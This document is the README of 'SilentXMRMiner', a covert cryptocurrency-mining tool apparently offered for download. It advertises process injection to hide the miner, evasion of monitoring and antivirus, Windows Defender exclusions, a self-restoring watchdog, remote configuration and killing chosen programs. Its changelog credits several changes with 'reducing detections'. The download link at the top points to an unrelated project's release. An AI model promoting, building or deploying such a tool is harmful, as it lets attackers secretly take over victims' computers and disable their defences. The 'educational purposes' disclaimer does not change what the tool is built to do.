# [DOWNLOAD](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/releases/tag/v2.12.4)


![SilentXMRMiner](https://github.com/user-attachments/assets/7d27ea9a-7120-4d94-b424-170278d4ed9a)


# SilentXMRMiner v1.5.1 - Based on Lime Miner v0.3



Can mine all the following algorithms and thus all the cryptocurrencies that use them:
<details>
 <summary>List of algorithms</summary>
 <table>
	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
	<tr><td>rx/0</td><td>Monero</td></tr>
	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
	<tr><td>rx/arq</td><td>ArQmA</td></tr>
	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
	<tr><td>cn/ccx</td><td>Conceal</td></tr>
	<tr><td>astrobwt</td><td>Dero</td></tr>
	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
	<tr><td>cn/rwz</td><td>Graft</td></tr>
	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
	<tr><td>cn/half</td><td>Masari</td></tr>
	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
	<tr><td>kawpow</td><td>Ravencoin</td></tr>
	<tr><td>rx/sfx</td><td>Safex</td></tr>
	<tr><td>cn/r</td><td>Sumokoin</td></tr>
	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
	<tr><td>rx/wow</td><td>Wownero</td></tr>
	<tr><td>cn/zls</td><td></td></tr>
	<tr><td>cn/double</td><td></td></tr>
	<tr><td>cn/2</td><td></td></tr>
	<tr><td>cn/xao</td><td></td></tr>
	<tr><td>cn/rto</td><td></td></tr>
	<tr><td>cn-heavy/tube</td><td></td></tr>
	<tr><td>cn-heavy/0</td><td></td></tr>
	<tr><td>cn/1</td><td></td></tr>
	<tr><td>cn-lite/1</td><td></td></tr>
	<tr><td>cn-lite/0</td><td></td></tr>
	<tr><td>cn/0</td><td></td></tr>
</table>
</details>

## Main Features

* Native & .NET - Miner installer and watchdog coded in C#, Shellcode loader/injector coded in C, miner requires .NET Framework 4.5
* Shellcode - All .NET C# parts are converted into Shellcode and injected using a native C loader, can be disabled
* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or other processes
* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
* Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
* Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
* Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
* Process Killer - Constantly checks for any programs in the "Kill Targets" and kills them if found

## Downloads

You can download the latest version in the Releases section


## Changelog

### v1.5.1 (16/07/2024)
* Added Process Killer feature that constantly checks for the "Kill Targets" programs and kills them if found
* Changed system calls to direct system calls thus reducing detections
* Changed native loader code to reduce detections
* Removed Online Download feature due to domain being taken down
* Improved overall code
* Updated miner
  
### v1.5.0 (02/10/2023)
**The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
* Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
* Added custom tcc C compiler to compile the Shellcode loader
* Added custom windres resource compiler to allow icons, assembly data and run as administrator for the native C program
* Added donut to convert .NET programs into Shellcode
* Added option to disable Shellcode loader
* Remade and optimized much of the miner and watchdog code
* Removed old C# loader
* Renamed Install to Startup due to confusion




## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.



